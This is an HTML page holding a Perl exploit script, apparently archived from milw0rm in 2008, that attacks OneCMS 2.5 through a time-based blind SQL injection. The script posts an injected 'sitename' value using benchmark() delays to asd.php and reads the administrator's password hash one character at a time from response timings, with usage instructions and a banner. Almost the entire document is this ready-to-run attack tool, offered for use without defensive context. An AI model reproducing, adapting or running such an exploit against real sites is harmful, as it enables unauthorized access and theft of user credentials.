<html><head><title>OneCMS 2.5 Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
# OneCMS 2.5 Remote Blind SQL Injection Exploit
# Author : Cod3rZ
# Site : http://cod3rz.helloweb.eu
# Site : http://devilsnight.altervista.org
# Usage : perl oc.pl site
# There's many other bugs, find them yourself

use LWP::UserAgent;
use HTTP::Request::Common;
use Time::HiRes;

$ua = LWP::UserAgent-&gt;new;

$site = $ARGV[0];

if(!$site) { &amp;usage; }
@array = (48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);

sub usage {
 print &quot; Usage: perl oc.pl site \n&quot;;
 print &quot; Ex.: perl oc.pl http://127.0.0.1 \n&quot;;
}
sub request {
 $var = $_[0];
 $start = Time::HiRes::time();
 $response = $ua-&gt;request(POST $site.'/asd.php',[ sitename =&gt; $var, ]);
 $response-&gt;is_success() || print(&quot;$!\n&quot;);
 $end = Time::HiRes::time();
 $time = $end - $start;
 return $time
}
sub refresh{
 system(&quot;cls&quot;);
 print &quot; -------------------------------------------------\n&quot;;
 print &quot; OneCMS 2.5 Remote Blind Sql Injection Exploit    \n&quot;;
 print &quot; Powered by Cod3rZ                                \n&quot;;
 print &quot; http://cod3rz.helloweb.eu                        \n&quot;;
 print &quot; -------------------------------------------------\n&quot;;
 print &quot; Please Wait..                                    \n&quot;;
 print &quot; Hash : &quot; . $_[3] . &quot;                             \n&quot;;
 print &quot; -------------------------------------------------\n&quot;;
}
for ($i = 1; $i &lt; 33; $i++)
 {
  for ($j = 0; $j &lt; 16; $j++)
   {
   $var = &quot;lol'+(SELECT IF ((ASCII( SUBSTRING( `password` , &quot;.$i.&quot;, 1 ) ) =&quot;.$array[$j].&quot; ) , benchmark( 200000000, CHAR( 0 )),0) FROM onecms_users WHERE `id` =1)+ '', '', '', '', '', '', '', '', '', '')/*&quot;;
 $time = request($var);
 refresh($host,$timedefault,$j,$hash,$time,$i);
if($time &gt; 4)
{
 $time = request($var);
 refresh($host,$timedefault,$j,$hash,$time,$i);
 $hash .= chr($array[$j]);
 refresh($host,$timedefault,$j,$hash,$time,$i);
 $j=200;
}}

if($i == 1 &amp;&amp; !$hash)
{
 print &quot; Failed                                           \n&quot;;
 print &quot; -------------------------------------------------\n&quot;;
 die();
}
if($i == 32) {
 print &quot; Exploit Terminated                               \n&quot;;
 print &quot; -------------------------------------------------\n &quot;;
 system('pause');
}}

# milw0rm.com [2008-05-07]</pre></html>